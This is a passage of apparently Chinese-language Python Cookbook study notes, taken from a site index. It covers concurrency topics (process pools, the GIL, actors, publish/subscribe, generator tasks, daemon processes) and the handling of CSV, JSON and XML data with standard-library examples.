被提交的任务必须是简单函数形式。对于方法、闭包和其他类型的并行执行还不\n支持。\n· 函数参数和返回值必须兼容 pickle，因为要使用到进程间的通信，所有解释器之\n间的交换数据必须被序列化\n· 被提交的任务函数不应保留状态或有副作用。除了打印日志之类简单的事情， 一旦启动你不能控制子进程的任何行为，因此最好保持简单和纯洁——函数不要\n去修改环境。 在 Unix 上进程池通过调用 fork() 系统调用被创建， 它会克隆 Python 解释器，包括 fork 时的所有程序状态。而在 Windows 上，克隆解\n释器时不会克隆状态。实际的 fork 操作会在第一次调用 pool.map() 或 pool.submit()\n后发生。 当你混合使用进程池和多线程的时候要特别小心。 你应该在创建任何线程之前先创建并激活进程池（比如在程序启动的 main 线程中\n创建进程池）。 Python 的全局锁问题 问题 你已经听说过全局解释器锁 GIL，担心它会影响到多线程程序的执行性能。 解决方案 尽管 Python 完全支持多线程编程，但是解释器的 C 语言实现部分在完全并行执\n行时并不是线程安全的。实际上，解释器被一个全局解释器锁保护着，它确保任何时候\n都只有一个 Python 线程执行。GIL 最大的问题就是 Python 的多线程程序并不能利用\n多核 CPU 的优势（比如一个使用了多个线程的计算密集型程序只会在一个单 CPU 上\n面运行）。 在讨论普通的 GIL 之前，有一点要强调的是 GIL 只会影响到那些严重依赖 CPU\n的程序（比如计算型的）。如果你的程序大部分只会涉及到 I/O，比如网络交互，那么\n使用多线程就很合适，因为它们大部分时间都在等待。实际上，你完全可以放心的创建\n几千个 Python 线程，现代操作系统运行这么多线程没有任何压力，没啥可担心的。 而对于依赖 CPU 的程序，你需要弄清楚执行的计算的特点。例如，优化底层算法\n要比使用多线程运行快得多。类似的，由于 Python 是解释执行的，如果你将那些性能\n瓶颈代码移到一个 C 语言扩展模块中，速度也会提升的很快。如果你要操作数组，那\n么使用 NumPy 这样的扩展会非常的高效。最后，你还可以考虑下其他可选实现方案，\n比如 PyPy，它通过一个 JIT 编译器来优化执行效率（不过在写这本书的时候它还不能\n支持 Python 3）。 还有一点要注意的是，线程不是专门用来优化性能的。一个 CPU 依赖型程序可能\n会使用线程来管理一个图形用户界面、一个网络连接或其他服务。这时候，GIL 会产生\n一些问题，因为如果一个线程长期持有 GIL 的话会导致其他非 CPU 型线程一直等待。\n事实上，一个写的不好的 C 语言扩展会导致这个问题更加严重，尽管代码的计算部分\n会比之前运行的更快些。 说了这么多，现在想说的是我们有两种策略来解决 GIL 的缺点。首先，如果你完\n全工作于 Python 环境中，你可以使用 multiprocessing 模块来创建一个进程池，并\n像协同处理器一样的使用它。使用一个技巧利用进程池解决了 GIL 的问题。当一个线程想要执行 CPU\n密集型工作时，会将任务发给进程池。然后进程池会在另外一个进程中启动一个单独的\nPython 解释器来工作。当线程等待结果的时候会释放 GIL。并且，由于计算任务在单\n独解释器中执行，那么就不会受限于 GIL 了。在一个多核系统上面，你会发现这个技\n术可以让你很好的利用多 CPU 的优势。 另外一个解决 GIL 的策略是使用 C 扩展编程技术。主要思想是将计算密集型任务\n转移给 C，跟 Python 独立，在工作的时候在 C 代码中释放 GIL。这可以通过在 C 代\n码中插入下面这样的特殊宏来完成: #include \"Python.h\"\n...\nPyObject *pyfunc(PyObject *self, PyObject *args) {\n  ...\n  Py_BEGIN_ALLOW_THREADS\n  // Threaded C code\n  ...\n  Py_END_ALLOW_THREADS\n  ...\n} 如果你使用其他工具访问 C 语言，比如对于 Cython 的 ctypes 库，你不需要做任\n何事。例如，ctypes 在调用 C 时会自动释放 GIL。 讨论 许多程序员在面对线程性能问题的时候，马上就会怪罪 GIL，什么都是它的问题。\n其实这样子太不厚道也太天真了点。作为一个真实的例子，在多线程的网络编程中神秘\n的 stalls 可能是因为其他原因比如一个 DNS 查找延时，而跟 GIL 毫无关系。最后你\n真的需要先去搞懂你的代码是否真的被 GIL 影响到。同时还要明白 GIL 大部分都应该\n只关注 CPU 的处理而不是 I/O. 如果你准备使用一个处理器池，注意的是这样做涉及到数据序列化和在不同\nPython 解释器通信。被执行的操作需要放在一个通过 def 语句定义的 Python 函数中，\n不能是 lambda、闭包可调用实例等，并且函数参数和返回值必须要兼容 pickle。同样，\n要执行的任务量必须足够大以弥补额外的通信开销。 另外一个难点是当混合使用线程和进程池的时候会让你很头疼。如果你要同时使\n用两者，最好在程序启动时，创建任何线程之前先创建一个单例的进程池。然后线程使\n用同样的进程池来进行它们的计算密集型工作。 C 扩展最重要的特征是它们和 Python 解释器是保持独立的。也就是说，如果你准\n备将 Python 中的任务分配到 C 中去执行，你需要确保 C 代码的操作跟 Python 保持\n独立，这就意味着不要使用 Python 数据结构以及不要调用 Python 的 C API。另外一\n个就是你要确保 C 扩展所做的工作是足够的，值得你这样做。也就是说 C 扩展担负起\n了大量的计算任务，而不是少数几个计算。 这些解决 GIL 的方案并不能适用于所有问题。例如，某些类型的应用程序如果被\n分解为多个进程处理的话并不能很好的工作，也不能将它的部分代码改成 C 语言执行。\n对于这些应用程序，你就要自己需求解决方案了（比如多进程访问共享内存区，多解析\n器运行于同一个进程等）。或者，你还可以考虑下其他的解释器实现，比如 PyPy。 定义一个 Actor 任务 问题 你想定义跟 actor 模式中类似\"actors\"角色的任务 解决方案 actor 模式是一种最古老的也是最简单的并行和分布式计算解决方案。事实上，它\n天生的简单性是它如此受欢迎的重要原因之一。简单来讲，一个 actor 就是一个并发执\n行的任务，只是简单的执行发送给它的消息任务。响应这些消息时，它可能还会给其他\nactor 发送更进一步的消息。actor 之间的通信是单向和异步的。因此，消息发送者不知\n道消息是什么时候被发送，也不会接收到一个消息已被处理的回应或通知。 讨论 actor 模式的魅力就在于它的简单性。 实现消息发布/订阅模型 问题 你有一个基于线程通信的程序，想让它们实现发布/订阅模式的消息通信 解决方案 要实现发布/订阅的消息通信模式，你通常要引入一个单独的\"交换机\"或\"网关\"\n对象作为所有消息的中介。也就是说，不直接将消息从一个任务发送到另一个，而是将\n其发送给交换机，然后由交换机将它发送给一个或多个被关联任务。 讨论 通过队列发送消息的任务或线程的模式很容易被实现并且也非常普遍。不过，使用\n发布/订阅模式的好处更加明显。 首先，使用一个交换机可以简化大部分涉及到线程通信的工作。无需去写通过多进\n程模块来操作多个线程，你只需要使用这个交换机来连接它们。某种程度上，这个就跟\n日志模块的工作原理类似。实际上，它可以轻松的解耦程序中多个任务。 其次，交换机广播消息给多个订阅者的能力带来了一个全新的通信模式。例如，你\n可以使用多任务系统、广播或扇出。你还可以通过以普通订阅者身份绑定来构建调试和\n诊断工具。 关于交换机的一个可能问题是对于订阅者的正确绑定和解绑。为了正确的管理资\n源，每一个绑定的订阅者必须最终要解绑。\n如: exc = get_exchange('name')\nexc.attach(some_task)\ntry:\n  ...\nfinally:\n  exc.detach(some_task) 某种意义上，这个和使用文件、锁和类似对象很像。通常很容易会忘记最后的\ndetach() 步骤。为了简化这个，你可以考虑使用上下文管理器协议。 最后还应该注意的是关于交换机的思想有很多种的扩展实现。例如，交换机可以实\n现一整个消息通道集合或提供交换机名称的模式匹配规则。交换机还可以被扩展到分\n布式计算程序中（比如，将消息路由到不同机器上面的任务中去）。 使用生成器代替线程 问题 你想使用生成器（协程）替代系统线程来实现并发。这个有时又被称为用户级线程\n或绿色线程。 解决方案 要使用生成器实现自己的并发，你首先要对生成器函数和 yield 语句有深刻理解。\nyield 语句会让一个生成器挂起它的执行，这样就可以编写一个调度器，将生成器当做\n某种\"任务\"并使用任务协作切换来替换它们的执行。 讨论 在构建基于生成器的并发框架时，通常会使用更常见的 yield 形式: def some_generator():\n  ...\n  result = yield data\n  ... 使用这种形式的 yield 语句的函数通常被称为\"协程\"。通过调度器，yield 语句在\n一个循环中被处理，如下: f = some_generator()\n\n# Initial result. Is None to start since nothing has been computed\nresult = None\n\nwhile True:\n  try:\n    data = f.send(result)\n    result = ... do some calculation ...\n  except StopIteration:\n    break yield from 语句被用来实现协程，可以被其它生成器作为\n子程序或过程来调用。本质上就是将控制权透明的传输给新的函数。不像普通的生成\n器，一个使用 yield from 被调用的函数可以返回一个作为 yield from 语句结果的值。 如果使用生成器编程，要提醒你的是它还是有很多缺点的。特别是，你得不\n到任何线程可以提供的好处。例如，如果你执行 CPU 依赖或 I/O 阻塞程序，它会将整\n个任务挂起知道操作完成。为了解决这个问题，你只能选择将操作委派给另外一个可以\n独立运行的线程或进程。另外一个限制是大部分 Python 库并不能很好的兼容基于生成\n器的线程。如果你选择这个方案，你会发现你需要自己改写很多标准库函数。 多个线程队列轮询 问题 你有一个线程队列集合，想为到来的元素轮询它们，就跟你为一个客户端请求去轮\n询一个网络连接集合的方式一样。 解决方案 对于轮询问题的一个常见解决方案中有个很少有人知道的技巧，包含了一个隐藏\n的回路网络连接。本质上讲其思想就是：对于每个你想要轮询的队列，你创建一对连接\n的套接字。然后你在其中一个套接字上面编写代码来标识存在的数据，另外一个套接字\n被传给 select() 或类似的一个轮询数据到达的函数: # Compatibility on non-POSIX systems\nserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver.bind(('127.0.0.1', 0))\nserver.listen(1)\nself._putsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nself._putsocket.connect(server.getsockname())\nself._getsocket, _ = server.accept()\nserver.close() 讨论 对于轮询非类文件对象，比如队列通常都是比较棘手的问题。例如，如果你不使用\n上面的套接字技术，你唯一的选择就是编写代码来循环遍历这些队列并使用一个定时\n器。 这样做其实不合理，还会引入其他的性能问题。例如，如果新的数据被加入到一个\n队列中，至少要花 sleep的时间 才能被发现。如果你之前的轮询还要去轮询其他对象，比如\n网络套接字那还会有更多问题。 在 Unix 系统上面启动守护进程 问题 你想编写一个作为一个在 Unix 或类 Unix 系统上面运行的守护进程运行的程序 解决方案 创建一个正确的守护进程需要一个精确的系统调用序列以及对于细节的控制。 创建一个守护进程的步骤看上去不是很易懂，但是大体思想是这样的，首先，一个\n守护进程必须要从父进程中脱离。这是由 os.fork() 操作来完成的，并立即被父进程\n终止。\n在子进程变成孤儿后，调用 os.setsid() 创建了一个全新的进程会话，并设置子\n进程为首领。它会设置这个子进程为新的进程组的首领，并确保不会再有控制终端。如\n果这些听上去太魔幻，因为它需要将守护进程同终端分离开并确保信号机制对它不起\n作用。调用 os.chdir() 和 os.umask(0) 改变了当前工作目录并重置文件权限掩码。修\n改目录通常是个好主意，因为这样可以使得它不再工作在被启动时的目录。\n另外一个调用 os.fork() 在这里更加神秘点。这一步使得守护进程失去了获取新\n的控制终端的能力并且让它更加独立（本质上，该 daemon 放弃了它的会话首领低位，\n因此再也没有权限去打开控制终端了）。尽管你可以忽略这一步，但是最好不要这么做。 一旦守护进程被正确的分离，它会重新初始化标准 I/O 流指向用户指定的文件。\n这一部分有点难懂。跟标准 I/O 流相关的文件对象的引用在解释器中多个地方被找到\n（sys.stdout, sys.__stdout__ 等）。仅仅简单的关闭 sys.stdout 并重新指定它是行不\n通的，因为没办法知道它是否全部都是用的是 sys.stdout 。这里，我们打开了一个单\n独的文件对象，并调用 os.dup2() ，用它来代替被 sys.stdout 使用的文件描述符。这\n样，sys.stdout 使用的原始文件会被关闭并由新的来替换。还要强调的是任何用于文\n件编码或文本处理的标准 I/O 流还会保留原状。\n守护进程的一个通常实践是在一个文件中写入进程 ID，可以被其他程序后面使用\n到。daemonize() 函数的最后部分写了这个文件，但是在程序终止时删除了它。atexit.\nregister() 函数注册了一个函数在 Python 解释器终止时执行。一个对于 SIGTERM 的\n信号处理器的定义同样需要被优雅的关闭。信号处理器简单的抛出了 SystemExit() 异\n常。或许这一步看上去没必要，但是没有它，终止信号会使得不执行 atexit.register()\n注册的清理操作的时候就杀掉了解释器。一个杀掉进程的例子代码可以在程序最后的\nstop 命令的操作中看到。","tags":"后端; python","url":"/yq-docs-rear-end-python-cookbook-Concurrent-programming.html","loc":"/yq-docs-rear-end-python-cookbook-Concurrent-programming.html"},{"title":"数据编码和处理","text":"主要讨论使用 Python 处理各种不同方式编码的数据，比如 CSV 文件， JSON，XML 和二进制包装记录。\n不讨论特殊的算 法问题，而是关注于怎样获取和存储这些格式的数据。 读写 CSV 数据 对于大多数的 CSV 格式的数据读写问题，都可以使用 csv 库。例如:假设你在一 个名叫 stocks.csv 文件中有一些股票市场数据，就像这样: Symbol,Price,Date,Time,Change,Volume\n\"AA\",39.48,\"6/11/2007\",\"9:36am\",-0.18,181800\n\"AIG\",71.38,\"6/11/2007\",\"9:36am\",-0.15,195500\n\"AXP\",62.58,\"6/11/2007\",\"9:36am\",-0.46,935000\n\"BA\",98.31,\"6/11/2007\",\"9:36am\",+0.12,104800\n\"C\",53.08,\"6/11/2007\",\"9:36am\",-0.25,360900\n\"CAT\",78.29,\"6/11/2007\",\"9:36am\",-0.23,225400 如何将这些数据读取为一个元组的序列: import csv\nwith open('stocks.csv') as f:\n  f_csv = csv.reader(f)\n  headers = next(f_csv)\n  for row in f_csv:\n    # Process row\n    ... 在上面的代码中，row 会是一个列表。因此，为了访问某个字段，你需要使用下标， 如 row[0] 访问 Symbol，row[4] 访问 Change。\n由于这种下标访问通常会引起混淆，你可以考虑使用命名元组。例如: from collections import namedtuple\nwith open('stock.csv') as f:\n  f_csv = csv.reader(f)\n  headings = next(f_csv)\n  Row = namedtuple('Row', headings)\n  for r in f_csv:\n    row = Row(*r)\n    # Process row\n    ... 它允许你使用列名如 row.Symbol 和 row.Change 代替下标访问。\n需要注意的是这 个只有在列名是合法的 Python 标识符的时候才生效。\n如果不是的话，你可能需要修改 下原始的列名 (如将非标识符字符替换成下划线之类的)。 另外一个选择就是将数据读取到一个字典序列中去。可以这样做: import csv\nwith open('stocks.csv') as f:\n  f_csv = csv.DictReader(f)\n  for row in f_csv:\n    # process row\n    ... 在这个版本中，你可以使用列名去访问每一行的数据了。比如，row['Symbol'] 或 者 row['Change'] 为了写入 CSV 数据，你仍然可以使用 csv 模块，不过这时候先创建一个 writer 对象: headers = ['Symbol','Price','Date','Time','Change','Volume']\nrows = [('AA', 39.48, '6/11/2007', '9:36am', -0.18, 181800),\n        ('AIG', 71.38, '6/11/2007', '9:36am', -0.15, 195500),\n        ('AXP', 62.58, '6/11/2007', '9:36am', -0.46, 935000),\n      ]\nwith open('stocks.csv','w') as f:\n  f_csv = csv.writer(f)\n  f_csv.writerow(headers)\n  f_csv.writerows(rows) 如果你有一个字典序列的数据，可以像这样做: headers = ['Symbol', 'Price', 'Date', 'Time', 'Change', 'Volume']\nrows = [{'Symbol':'AA', 'Price':39.48, 'Date':'6/11/2007',\n        'Time':'9:36am', 'Change':-0.18, 'Volume':181800},\n        {'Symbol':'AIG', 'Price': 71.38, 'Date':'6/11/2007',\n        'Time':'9:36am', 'Change':-0.15, 'Volume': 195500},\n        {'Symbol':'AXP', 'Price': 62.58, 'Date':'6/11/2007',\n        'Time':'9:36am', 'Change':-0.46, 'Volume': 935000},\n        ]\n\nwith open('stocks.csv','w') as f:\n  f_csv = csv.DictWriter(f, headers)\n  f_csv.writeheader()\n  f_csv.writerows(rows) 你应该总是优先选择 csv 模块分割或解析 CSV 数据。例如，你可能会像编写类似 下面这样的代码: with open('stocks.csv') as f:\n  for line in f:\n    row = line.split(',')\n    # process row\n    ... 使用这种方式的一个缺点就是你仍然需要去处理一些棘手的细节问题。\n比如，如果 某些字段值被引号包围，你不得不去除这些引号。\n另外，如果一个被引号包围的字段碰 巧含有一个逗号，那么程序就会因为产生一个错误大小的行而出错。 默认情况下，csv 库可识别 Microsoft Excel 所使用的 CSV 编码规则。这或许也是 最常见的形式，并且也会给你带来最好的兼容性。\n然而，如果你查看 csv 的文档，就会 发现有很多种方法将它应用到其他编码格式上 (如修改分割字符等)。\n例如，如果你想 读取以 tab 分割的数据，可以这样做: # Example of reading tab-separated values\nwith open('stock.tsv') as f:\n  f_tsv = csv.reader(f, delimiter='\\t')\n  for row in f_tsv:\n    # Process row\n    ... 如果你正在读取 CSV 数据并将它们转换为命名元组，需要注意对列名进行合法性 认证。\n例如，一个 CSV 格式文件有一个包含非法标识符的列头行，类似下面这样: Street Address,Num-Premises,Latitude,Longitude 5412 N CLARK,10,41.980262,-87.668452 这样最终会导致在创建一个命名元组时产生一个 ValueError 异常而失败。为了解 决这问题，你可能不得不先去修正列标题。\n例如，可以像下面这样在非法标识符上使用 一个正则表达式替换: import re\nwith open('stock.csv') as f:\n  f_csv = csv.reader(f)\n  headers = [ re.sub('[&#94;a-zA-Z_]', '_', h) for h in next(f_csv) ]\n  Row = namedtuple('Row', headers)\n  for r in f_csv:\n    row = Row(*r)\n    # Process row\n    ... 还有重要的一点需要强调的是，csv 产生的数据都是字符串类型的，它不会做任何 其他类型的转换。\n如果你需要做这样的类型转换，你必须自己手动去实现。\n下面是一个 在 CSV 数据上执行其他类型转换的例子: col_types = [str, float, str, str, float, int]\nwith open('stocks.csv') as f:\n  f_csv = csv.reader(f)\n  headers = next(f_csv)\n  for row in f_csv:\n    # Apply conversions to the row items\n    row = tuple(convert(value) for convert, value in zip(col_types, row))\n    ... 另外，下面是一个转换字典中特定字段的例子: print('Reading as dicts with type conversion')\nfield_types = [ ('Price', float),\n                ('Change', float),\n                ('Volume', int) ]\nwith open('stocks.csv') as f:\n  for row in csv.DictReader(f):\n    row.update((key, conversion(row[key]))\n              for key, conversion in field_types)\n    print(row) 通常来讲，你可能并不想过多去考虑这些转换问题。\n在实际情况中，CSV 文件都 或多或少有些缺失的数据，被破坏的数据以及其它一些让转换失败的问题。\n因此，除非 你的数据确实有保障是准确无误的，否则你必须考虑这些问题 (你可能需要增加合适的 错误处理机制)。 最后，如果你读取 CSV 数据的目的是做数据分析和统计的话，你可能需要看一看 Pandas 包。\nPandas 包含了一个非常方便的函数叫 pandas.read_csv() ，它可以加载 CSV 数据到一个 DataFrame 对象中去。\n然后利用这个对象你就可以生成各种形式的统 计、过滤数据以及执行其他高级操作了。 读写 JSON 数据 读写 JSON(JavaScript Object Notation) 编码格式的数据。 json 模块提供了一种很简单的方式来编码和解码 JSON 数据。\n其中两个主要的函 数是 json.dumps() 和 json.loads() ，要比其他序列化函数库如 pickle 的接口少得多。\n下面演示如何将一个 Python 数据结构转换为 JSON: import json\ndata = {\n    'name' : 'ACME',\n    'shares' : 100,\n    'price' : 542.23\n}\n\njson_str = json.dumps(data) 将一个 JSON 编码的字符串转换回一个 Python 数据结构: data = json.loads(json_str) 如果你要处理的是文件而不是字符串，你可以使用 json.dump() 和 json.load() 来编码和解码 JSON 数据 JSON 编码支持的基本数据类型为 None ，bool ，int ，float 和 str ，\n以及包含 这些类型数据的 lists，tuples 和 dictionaries。\n对于 dictionaries，keys 需要是字符串类 型 (字典中任何非字符串类型的 key 在编码时会先转换为字符串)。\n为了遵循 JSON 规 范，你应该只编码 Python 的 lists 和 dictionaries。\n而且，在 web 应用程序中，顶层对 象被编码为一个字典是一个标准做法。 JSON 编码的格式对于 Python 语法而已几乎是完全一样的，除了一些小的差异之 外。\n比如，True 会被映射为 true，False 被映射为 false，而 None 会被映射为 null。\n下 面是一个例子，演示了编码后的字符串效果: >>> json.dumps(False)\n'false'\n>>> d = {'a': True,\n...       'b': 'Hello',\n...       'c': None}\n>>> json.dumps(d)\n'{\"b\": \"Hello\", \"c\": null, \"a\": true}'\n>>> 如果你试着去检查 JSON 解码后的数据，你通常很难通过简单的打印来确定它 的结构，\n特别是当数据的嵌套结构层次很深或者包含大量的字段时。\n为了解决这个问 题，可以考虑使用 pprint 模块的 pprint() 函数来代替普通的 print() 函数。\n它会按 照 key 的字母顺序并以一种更加美观的方式输出。\n下面是一个演示如何漂亮的打印输 出 Twitter 上搜索结果的例子: >>> from urllib.request import urlopen\n>>> import json\n>>> u = urlopen('http://search.twitter.com/search.json?q=python&rpp=5')\n>>> resp = json.loads(u.read().decode('utf-8')) >>> from pprint import pprint\n>>> pprint(resp)\n{'completed_in': 0.074,\n'max_id': 264043230692245504,\n'max_id_str': '264043230692245504',\n'next_page': '?page=2&max_id=264043230692245504&q=python&rpp=5', 'page': 1,\n'query': 'python',\n'refresh_url': '?since_id=264043230692245504&q=python',\n'results': [{'created_at': 'Thu, 01 Nov 2012 16:36:26 +0000',\n            'from_user': ...\n            },\n            {'created_at': 'Thu, 01 Nov 2012 16:36:14 +0000',\n            'from_user': ...\n            },\n            {'created_at': 'Thu, 01 Nov 2012 16:36:13 +0000',\n            'from_user': ...\n            },\n            {'created_at': 'Thu, 01 Nov 2012 16:36:07 +0000',\n            'from_user': ...\n            }\n            {'created_at': 'Thu, 01 Nov 2012 16:36:04 +0000',\n            'from_user': ...\n            }],\n'results_per_page': 5,\n'since_id': 0,\n'since_id_str': '0'}\n>>> 一般来讲，JSON 解码会根据提供的数据创建 dicts 或 lists。\n如果你想要创建其他 类型的对象，可以给 json.loads() 传递 object_pairs_hook 或 object_hook 参数。\n例 如，下面是演示如何解码 JSON 数据并在一个 OrderedDict 中保留其顺序的例子: >>> s = '{\"name\": \"ACME\", \"shares\": 50, \"price\": 490.1}'\n>>> from collections import OrderedDict\n>>> data = json.loads(s, object_pairs_hook=OrderedDict)\n>>> data\nOrderedDict([('name', 'ACME'), ('shares', 50), ('price', 490.1)])\n>>> 下面是如何将一个 JSON 字典转换为一个 Python 对象例子: >>> class JSONObject:\n...   def __init__(self, d):\n...     self.__dict__ = d\n...\n\n>>>\n>>> data = json.loads(s, object_hook=JSONObject)\n>>> data.name\n'ACME'\n>>> data.shares\n50\n>>> data.price\n490.1\n>>> JSON 解码后的字典作为一个单个参数传递给 __init__() 。\n然 后，你就可以随心所欲的使用它了，比如作为一个实例字典来直接使用它。 如果你想获得漂亮的格式化字符串 后输出，可以使用 json.dumps() 的 indent 参数。 对象实例通常并不是 JSON 可序列化的。\n如果你想序列化对象实例，你可以提供一个函数，它的输入是一个实例，返回一个 可序列化的字典。例如: def serialize_instance(obj):\n  d = { '__classname__' : type(obj).__name__ }\n  d.update(vars(obj))\n  return d 如果你想反过来获取这个实例，可以这样做: # Dictionary mapping names to known classes\nclasses = {\n    'Point' : Point\n}\n\ndef unserialize_object(d):\n  clsname = d.pop('__classname__', None)\n  if clsname:\n    cls = classes[clsname]\n    obj = cls.__new__(cls) # Make instance without calling __init__\n    for key, value in d.items():\n      setattr(obj, key, value)\n    return obj\n  else:\n    return d 如何使用这些函数: >>> p = Point(2,3)\n>>> s = json.dumps(p, default=serialize_instance)\n>>> s\n'{\"__classname__\": \"Point\", \"y\": 3, \"x\": 2}'\n>>> a = json.loads(s, object_hook=unserialize_object)\n>>> a\n<__main__.Point object at 0x1017577d0>\n>>> a.x\n2\n>>> a.y\n3\n>>> 解析简单的 XML 数据 可以使用 xml.etree.ElementTree 模块从简单的 XML 文档中提取数据。\n为了演 示，假设你想解析 Planet Python 上的 RSS 源。下面是相应的代码: from urllib.request import urlopen\nfrom xml.etree.ElementTree import parse\n\n# Download the RSS feed and parse it\nu = urlopen('http://planet.python.org/rss20.xml')\ndoc = parse(u)\n\n# Extract and output tags of interest\nfor item in doc.iterfind('channel/item'):\n  title = item.findtext('title')\n  date = item.findtext('pubDate')\n  link = item.findtext('link')\n\n  print(title)\n  print(date)\n  print(link)\n  print() xml.etree.ElementTree.parse() 函数解析整个 XML 文档并将其转换成一个文 档对象。\n然后，你就能使用 find() 、iterfind() 和 findtext() 等方法来搜索特定的 XML 元素了。\n这些函数的参数就是某个指定的标签名， 例如 channel/item 或 title 。 channel/item 表示 <channel> 标签下的 <item> 标签 title 表示 <title> 标签 ElementTree 模块中的每个元素有一些重要的属性和方法，在解析的时候非常有 用。\ntag 属性包含了标签的名字，text 属性包含了内部的文本，而 get() 方法能获取 属性值。例如: >>> doc\n<xml.etree.ElementTree.ElementTree object at 0x101339510>\n>>> e = doc.find('channel/title')\n>>> e\n<Element 'title' at 0x10135b310>\n>>> e.tag\n'title'\n>>> e.text\n'Planet Python'\n>>> e.get('some_attribute')\n>>> 有一点要强调的是 xml.etree.ElementTree 并不是 XML 解析的唯一方法。\n对于 更高级的应用程序，你需要考虑使用 lxml 。\n它使用了和 ElementTree 同样的编程接 口，因此上面的例子同样也适用于 lxml。\n你只需要将刚开始的 import 语句换成 from lxml.etree import parse 就行了。\nlxml 完全遵循 XML 标准，并且速度也非常快，同 时还支持验证，XSLT，和 XPath 等特性。 增量式解析大型 XML 文件 用尽可能少的内存从一个超大的 XML 文档中提取数据 任何时候只要你遇到增量式的数据处理时，第一时间就应该想到迭代器和生成器。\n下面是一个很简单的函数，只使用很少的内存就能增量式的处理一个大型 XML 文件: def parse_and_remove(filename, path):\n  path_parts = path.split('/')\n  doc = iterparse(filename, ('start', 'end'))\n  # Skip the root element\n  next(doc)\n\n  tag_stack = []\n  elem_stack = []\n  for event, elem in doc:\n    if event == 'start':\n      tag_stack.append(elem.tag)\n      elem_stack.append(elem)\n    elif event == 'end':\n      if tag_stack == path_parts:\n        yield elem\n        elem_stack[-2].remove(elem)\n      try:\n        tag_stack.pop()\n        elem_stack.pop()\n      except IndexError:\n        pass 依赖 ElementTree 模块中的两个核心功能。\n第一，iterparse() 方 法允许对 XML 文档进行增量操作。\n使用时，你需要提供文件名和一个包含下面一种或 多种类型的事件列表:start , end, start-ns 和 end-ns 。\n由 iterparse() 创建的迭 代器会产生形如 (event, elem) 的元组，\n其中 event 是上述事件列表中的某一个，而 elem 是相应的 XML 元素。例如: >>> data = iterparse('potholes.xml',('start','end'))\n>>> next(data)\n('start', <Element 'response' at 0x100771d60>)\n>>> next(data)\n('start', <Element 'row' at 0x100771e68>)\n>>> next(data)\n('start', <Element 'row' at 0x100771fc8>)\n>>> next(data)\n('start', <Element 'creation_date' at 0x100771f18>)\n>>> next(data)\n('end', <Element 'creation_date' at 0x100771f18>)\n>>> next(data)\n('start', <Element 'status' at 0x1006a7f18>)\n>>> next(data)\n('end', <Element 'status' at 0x1006a7f18>)\n>>> start 事件在某个元素第一次被创建并且还没有被插入其他数据 (如子元素) 时被 创建。而 end 事件在某个元素已经完成时被创建. 尽管没有在例子中演示，start-ns 和 end-ns 事件被用来处理 XML 文档命名空间的声明。 将字典转换为 XML 使用一个 Python 字典存储数据，并将它转换成 XML 格式。 尽管 xml.etree.ElementTree 库通常用来做解析工作，其实它也可以创建 XML 文档。例如，考虑如下这个函数: from xml.etree.ElementTree import Element\n\ndef dict_to_xml(tag, d):\n  '''\n  Turn a simple dict of key/value pairs into XML\n  '''\n  elem = Element(tag)\n  for key, val in d.items():\n      child = Element(key)\n      child.text = str(val)\n      elem.append(child)\n  return elem 使用: >>> s = { 'name': 'GOOG', 'shares': 100, 'price':490.1 }\n>>> e = dict_to_xml('stock', s)\n>>> e\n<Element 'stock' at 0x1004b64c8>\n>>> 转换结果是一个 Element 实例。\n对于 I/O 操作，使用 xml.etree.ElementTree 中 的 tostring() 函数很容易就能将它转换成一个字节字符串。例如: >>> from xml.etree.ElementTree import tostring\n>>> tostring(e)\nb'<stock><price>490.1</price><shares>100</shares><name>GOOG</name></stock>'\n>>> 如果你想给某个元素添加属性值，可以使用 set() 方法: >>> e.set('_id','1234')\n\n>>> tostring(e)\nb'<stock _id=\"1234\"><price>490.1</price><shares>100</shares><name>GOOG</name> </stock>'\n>>> 如果你还想保持元素的顺序，可以考虑构造一个 OrderedDict 来代替一个普通的 字典. 当创建 XML 的时候，你被限制只能构造字符串类型的值。 问题是如果你手动的去构造的时候可能会碰到一些麻烦。例如，当字典的值中包含 一些特殊字符的时候会怎样呢?: >>> d = { 'name' : '<spam>' }\n>>> # String creation\n>>> dict_to_xml_str('item',d)\n'<item><name><spam></name></item>'\n>>> # Proper XML creation\n>>> e = dict_to_xml('item',d)\n>>> tostring(e)\nb'<item><name>&lt;spam&gt;</name></item>'\n>>> 注意到程序的后面那个例子中，字符‘<'和‘>'被替换成了 &lt; 和 &gt; 下面仅供参考，如果你需要手动去转换这些字符，可以使用 xml.sax.saxutils 中\n的 escape() 和 unescape() 函数。例如: >>> from xml.sax.saxutils import escape, unescape\n>>> escape('<spam>')\n'&lt;spam&gt;'\n>>> unescape(_)\n'<spam>'\n>>> 解析和修改 XML 读取一个 XML 文档，对它最一些修改，然后将结果写回 XML 文档。 数据文件 pred.xml: <?xml version=\"1.0\"?>\n<stop>\n  <id>14791</id>\n  <nm>Clark &amp; Balmoral</nm>\n  <sri>\n    <rt>22</rt>\n    <d>North Bound</d>\n    <dd>North Bound</dd>\n  </sri>\n  <cr>22</cr>\n  <pre>\n    <pt>5 MIN</pt>\n    <fd>Howard</fd>\n    <v>1378</v>\n    <rn>22</rn>\n  </pre>\n  <pre>\n    <pt>15 MIN</pt>\n    <fd>Howard</fd>\n    <v>1867</v>\n    <rn>22</rn>\n  </pre>\n</stop> 下面是一个利用 ElementTree 来读取这个文档并对它做一些修改的例子: >>> from xml.etree.ElementTree import parse, Element\n>>> doc = parse('pred.xml')\n>>> root = doc.getroot()\n>>> root\n<Element 'stop' at 0x100770cb0>\n>>> # Remove a few elements\n>>> root.remove(root.find('sri'))\n>>> root.remove(root.find('cr'))\n>>> # Insert a new element after <nm>...</nm>\n>>> root.getchildren().index(root.find('nm'))\n1\n>>> e = Element('spam')\n>>> e.text = 'This is a test'\n>>> root.insert(2, e)\n>>> # Write back to a file\n>>> doc.write('newpred.xml', xml_declaration=True)\n>>> 处理结果是一个像下面这样新的 XML 文件: <?xml version='1.0' encoding='us-ascii'?>\n<stop>\n  <id>14791</id>\n  <nm>Clark &amp; Balmoral</nm>\n  <spam>This is a test</spam>\n  <pre>\n    <pt>5 MIN</pt>\n    <fd>Howard</fd>\n    <v>1378</v>\n    <rn>22</rn>\n  </pre>\n  <pre>\n    <pt>15 MIN</pt>\n    <fd>Howard</fd>\n    <v>1867</v>\n    <rn>22</rn>\n  </pre>\n</stop> 修改一个 XML 文档结构是很容易的，但是你必须牢记的是所有的修改都是针对\n父节点元素，将它作为一个列表来处理。例如，如果你删除某个元素，通过调用父节\n点的 